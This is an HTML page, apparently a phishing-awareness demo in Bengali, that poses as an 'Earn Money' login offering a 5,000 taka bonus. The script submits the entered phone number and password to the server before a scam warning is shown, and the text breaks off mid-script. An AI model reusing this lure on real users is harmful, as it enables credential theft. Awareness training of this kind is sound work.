<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earn Money - Login</title>
    <style>
        body { font-family: sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #1e1e1e; padding: 30px; border-radius: 10px; width: 320px; box-shadow: 0 0 20px rgba(0,0,0,0.5); text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        .btn { background: #ffcc00; color: #000; width: 100%; padding: 10px; border: none; font-weight: bold; cursor: pointer; }
        .result { margin-top: 15px; font-weight: bold; }
        .scam-alert { display: none; color: #ff4d4d; background: #331111; padding: 15px; border-radius: 5px; margin-top: 20px; border: 1px solid red; font-size: 14px; }
    </style>
</head>
<body>

<div class="login-box">
    <h2 style="color: #ffcc00;">Login to Earn</h2>
    <p>আপনার নম্বর দিয়ে লগইন করে ৫০০০ টাকা বোনাস নিন!</p>
    
    <form name="fileForm">
        <input type="text" name="phone" placeholder="ফোন নম্বর" required>
        <input type="password" name="pass" placeholder="পাসওয়ার্ড" required>
        <button type="submit" class="btn">লগইন করুন</button>
    </form>

    <div class="result"></div>

    <div id="scam-alert" class="scam-alert">
        🛑 <b>সাবধান!</b> <br>
        আপনি এইমাত্র একটি ভুয়া সাইটে আপনার তথ্য দিলেন। এভাবেই আপনার পাসওয়ার্ড ও ফোন নম্বর চুরি হয়। <br>
        <br>
        <i>শিক্ষা: অপরিচিত সাইটে কখনো নিজের তথ্য দেবেন না।</i>
    </div>
</div>

<script>
// আপনার দেওয়া কোডটি এখানে ব্যবহার করা হয়েছে
document.forms.fileForm.addEventListener("submit", event => {
  event.preventDefault();
  const result = document.querySelector(".result");
  const alertBox = document.getElementById("scam-alert");

  fetch("/", {
    body: new FormData(event.target),
    method: "POST"
  })
    .then(() => {
      // সফল হওয়ার বদলে আমরা সচেতনতা মেসেজ দেখাবো
      result.style.color = "#00ff00";
      result.innerText = "Processing...";
